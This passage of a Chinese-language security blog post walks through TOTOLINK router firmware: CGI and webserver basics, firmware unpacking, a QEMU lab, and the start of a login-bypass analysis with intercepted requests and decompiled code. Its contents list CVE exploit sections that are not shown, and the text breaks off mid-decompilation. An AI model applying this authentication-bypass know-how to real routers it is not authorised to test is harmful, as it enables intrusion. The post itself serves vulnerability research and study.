@@ -1,0 +1,840 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":100,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://Khighl.github.io.git';</script>
+  
+  <title>
+    totolink |
+    
+    Hexo
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="TOTOLINK–webserver与cgi| 0 | 前言经过了nepctf的洗礼,感觉自己找回了对二进制安全的热爱 依旧不会web,依旧被拷打…不过已经开始补web的知识了 | 1 | web基础知识固件包中,常见的二进制文件包括httpd&#x2F;xxx(.cgi) httpd用于  维护webserver,监听端口,等待客户端发发送的请求 显示静态页面(资源) 调用后端程序(cgi,ph">
+<meta property="og:type" content="article">
+<meta property="og:title" content="totolink">
+<meta property="og:url" content="https://khighl.github.io.git/2025/07/29/TOTOLINK/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="TOTOLINK–webserver与cgi| 0 | 前言经过了nepctf的洗礼,感觉自己找回了对二进制安全的热爱 依旧不会web,依旧被拷打…不过已经开始补web的知识了 | 1 | web基础知识固件包中,常见的二进制文件包括httpd&#x2F;xxx(.cgi) httpd用于  维护webserver,监听端口,等待客户端发发送的请求 显示静态页面(资源) 调用后端程序(cgi,ph">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://khighl.github.io.git/images/TOTOLINK/1753713078662.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/TOTOLINK/1753715023458.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/TOTOLINK/1753715385319.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/TOTOLINK/1753715749207.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/TOTOLINK/1753716813041.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/TOTOLINK/1753752291522.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/TOTOLINK/1753752541990.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/TOTOLINK/1753755389818.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/TOTOLINK/1753755429607.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/TOTOLINK/1753755819283.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/TOTOLINK/1753756045806.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/TOTOLINK/1753756147528.png">
+<meta property="article:published_time" content="2025-07-28T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-07-29T03:15:05.322Z">
+<meta property="article:author" content="zer00ne">
+<meta property="article:tag" content="安全">
+<meta property="article:tag" content="iot">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://khighl.github.io.git/images/TOTOLINK/1753713078662.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+  
+</div>
+<header id="header">
+  
+    
+      
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/banner.webp" alt="totolink">
+        
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">totolink</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TOTOLINK%E2%80%93webserver%E4%B8%8Ecgi"><span class="toc-number">1.</span> <span class="toc-text">TOTOLINK–webserver与cgi</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">| 0 | 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-web%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.2.</span> <span class="toc-text">| 1 | web基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.3.</span> <span class="toc-text">| 1 | 环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87%E6%B5%81%E7%A8%8B"><span class="toc-number">1.4.</span> <span class="toc-text">| 2 | 登录密码绕过流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.5.</span> <span class="toc-text">| 3 | 漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2022-41525"><span class="toc-number">1.5.1.</span> <span class="toc-text">CVE-2022-41525</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2022-41518"><span class="toc-number">1.5.2.</span> <span class="toc-text">CVE-2022-41518</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-1"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%90%8E%E8%AE%B0%E2%80%93%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8Dwebserver%E6%96%87%E4%BB%B6"><span class="toc-number">1.6.</span> <span class="toc-text">| 4 | 后记–如何快速定位webserver文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">1.6.1.</span> <span class="toc-text">启动脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E8%A1%A8%E5%8D%95%E6%90%9C%E7%B4%A2"><span class="toc-number">1.6.2.</span> <span class="toc-text">通过表单搜索</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="zer00ne" class="lazyload">
+  <div class="sidebar-author-name">zer00ne</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">18</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+  
+</aside>
+
+          <section id="main"><article id="post-TOTOLINK" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-07-28T16:00:00.000Z" itemprop="datePublished">2025-07-29</time>
+    <time style="display: none;" id="post-update-time">2025-07-29</time>
+  </span>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="TOTOLINK–webserver与cgi"><a href="#TOTOLINK–webserver与cgi" class="headerlink" title="TOTOLINK–webserver与cgi"></a>TOTOLINK–webserver与cgi</h1><h2 id="0-前言"><a href="#0-前言" class="headerlink" title="| 0 | 前言"></a>| 0 | 前言</h2><p>经过了<code>nepctf</code>的洗礼,感觉自己找回了对二进制安全的热爱</p>
+<p>依旧不会<code>web</code>,依旧被拷打…不过已经开始补<code>web</code>的知识了</p>
+<h2 id="1-web基础知识"><a href="#1-web基础知识" class="headerlink" title="| 1 | web基础知识"></a>| 1 | web基础知识</h2><p>固件包中,常见的二进制文件包括<code>httpd</code>&#x2F;<code>xxx(.cgi)</code></p>
+<p><code>httpd</code>用于</p>
+<ul>
+<li>维护<code>webserver</code>,监听端口,等待客户端发发送的请求</li>
+<li>显示静态页面(资源)</li>
+<li>调用后端程序(<code>cgi</code>,<code>php</code>)处理请求</li>
+<li>处理<code>HTTP协议</code>细节,如重定向、状态码、缓存控制</li>
+</ul>
+<p><code>cgi</code>用于请求处理的具体实现</p>
+<p><code>httpd</code>会<code>fork</code>出一个子进程用于执行(<code>execve</code>)<code>cgi</code>程序</p>
+<p><code>httpd</code>获取<code>client</code>报文,将不同的字段序列化后传递给<code>cgi</code></p>
+<p>后<code>cgi</code>与<code>httpd</code>通过<code>pipe管道</code>进行数据的交互,最后<code>cgi</code>进程终止并发送终止信号,<code>httpd</code>将响应传回<code>client</code></p>
+<p><img src="/images/TOTOLINK/1753713078662.png" alt="1753713078662"></p>
+<p>报文由客户端(通常是浏览器)发出,接收到<code>httpd</code>的回显后,如果包含重定向信息,浏览器会自动发送请求报文,跳转并访问到重定向的资源.</p>
+<p>比如响应数据包为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Found</span><br><span class="line">Content-type: text/plain</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Location: http://192.168.52.134/formLoginAuth.htm?authCode=0&amp;userName=&amp;goURL=login.html&amp;action=login</span><br><span class="line">Date: Mon, 28 Jul 2025 06:56:34 GMT</span><br><span class="line">Server: lighttpd/1.4.20</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">protal page</span><br></pre></td></tr></table></figure>
+
+<p>浏览器就会自动发送访问<code>http://192.168.52.134/formLoginAuth.htm?authCode=0&amp;userName=&amp;goURL=login.html&amp;action=login</code>的请求</p>
+<p><code>POST</code>与<code>GET</code>请求为<code>web</code>中最常见的两种请求方式</p>
+<p>其中<code>GET</code>直接通过<code>url</code>传参</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET(请求方式) /path/to/resource(请求资源路径)?key1=value1&amp;key2=value2(请求变量) HTTP/1.1(协议版本)</span><br><span class="line">Host: www.example.com(请求主机域名)</span><br><span class="line">User-Agent: Mozilla/5.0 ...(客户端类型)</span><br><span class="line">Accept: text/html,application/xhtml+xml,...(客户端期望接收到的消息的类型)</span><br><span class="line">[其他请求头]</span><br><span class="line">[空行]</span><br></pre></td></tr></table></figure>
+
+<p><code>POST</code>则通过请求体传参</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /submit-form HTTP/1.1</span><br><span class="line">Host: www.example.com</span><br><span class="line">User-Agent: Mozilla/5.0 ...</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 27</span><br><span class="line">[其他请求头]</span><br><span class="line">[空行]</span><br><span class="line">key1=value1&amp;key2=value2(请求变量)</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="| 1 | 环境搭建"></a>| 1 | 环境搭建</h2><ul>
+<li>固件下载:<a target="_blank" rel="noopener" href="https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/225/ids/36.html">totolink</a></li>
+<li>固件解包</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e --preserve-symlinks  TOTOLINK_C834FR-1C_NR1800X_IP04469_MT7621A_SPI_16M256M_V9.1.0u.6279_B20210910_ALL.web</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>搭建<code>qemu</code>环境,将文件系统传入其中<br>下载<code>qemu</code>:<a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/mipsel/">qemu下载</a></p>
+</li>
+<li><p>启动脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># TAP接口配置</span><br><span class="line">TAP_IF=&quot;tap0&quot;</span><br><span class="line">BR_IF=&quot;br0&quot;</span><br><span class="line"></span><br><span class="line"># 确保 tap0 存在，并添加进 br0</span><br><span class="line">sudo ip tuntap add dev $TAP_IF mode tap</span><br><span class="line">sudo ip link set $TAP_IF up</span><br><span class="line">sudo brctl addif $BR_IF $TAP_IF</span><br><span class="line">sudo qemu-system-mipsel \</span><br><span class="line">    -M malta \</span><br><span class="line">    -kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">    -hda debian_wheezy_mipsel_standard.qcow2 \</span><br><span class="line">    -append &quot;root=/dev/sda1 console=tty0&quot; \</span><br><span class="line">    -net nic,macaddr=00:16:3e:00:00:01 \</span><br><span class="line">    -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure></li>
+<li><p>我们观察文件系统,可以发现<code>lighttp/lighttpd.conf</code>中已经配置好了,那我们就可以在挂载后直接启动<code>httpd</code>服务</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mount -o bind /dev ./squashfs-root/dev</span><br><span class="line">mount -t proc /proc ./squashfs-root/proc</span><br><span class="line">chroot ./squashfs-root sh</span><br></pre></td></tr></table></figure></li>
+<li><p>启动服务</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lighttpd -f /lighttp/lighttpd.conf</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>我们在浏览器中输入<code>qemu</code>的<code>IP</code>,可以发现<code>web服务</code>已经出现,说明环境配置完成</p>
+<p><img src="/images/TOTOLINK/1753715023458.png" alt="1753715023458"></p>
+<h2 id="2-登录密码绕过流程"><a href="#2-登录密码绕过流程" class="headerlink" title="| 2 | 登录密码绕过流程"></a>| 2 | 登录密码绕过流程</h2><p>我们先在<code>brup</code>的内嵌浏览器打开拦截,随便输入一个密码(<code>123</code>),可以看到<code>POST</code>请求为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /cgi-bin/cstecgi.cgi?action=login HTTP/1.1</span><br><span class="line">Host: 192.168.52.134</span><br><span class="line">Content-Length: 27</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Origin: http://192.168.52.134</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.52.134/login.html</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Cookie: SESSION_ID=2:1753666445:2</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=123</span><br></pre></td></tr></table></figure>
+
+<p>我们将这段报文复制到复发送,发送后查看响应包</p>
+<p><img src="/images/TOTOLINK/1753715385319.png" alt="1753715385319"></p>
+<p>可以看到被重定向到<code>http://192.168.52.134/formLoginAuth.htm?authCode=0&amp;userName=&amp;goURL=login.html&amp;action=login</code></p>
+<p>我们直接点击<code>跟随重定向</code></p>
+<p>可以看到浏览器自动发送了一个如下<code>GET</code>请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /formLoginAuth.htm?authCode=0&amp;userName=&amp;goURL=login.html&amp;action=login HTTP/1.1</span><br><span class="line">Host: 192.168.52.134</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Origin: http://192.168.52.134</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.52.134/cgi-bin/cstecgi.cgi?action=login</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Cookie: SESSION_ID=2:1753666445:2</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>访问资源</code>为<code>html</code>,由<code>httpd</code>负责处理,所以我们使用<code>IDA</code>打开<code>httpd</code>,搜索<code>formLoginAuth</code>相关内容</p>
+<p><img src="/images/TOTOLINK/1753715749207.png" alt="1753715749207"></p>
+<p>明显通过函数名可以看出这个<code>Form_Login</code>是登录逻辑</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">Form_Login</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v6; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> authCode; <span class="comment">// $s5</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v10; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [sp+28h] [-A30h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v14[<span class="number">48</span>]; <span class="comment">// [sp+2Ch] [-A2Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v15[<span class="number">64</span>]; <span class="comment">// [sp+5Ch] [-9FCh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v16[<span class="number">80</span>]; <span class="comment">// [sp+9Ch] [-9BCh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [sp+ECh] [-96Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v18[<span 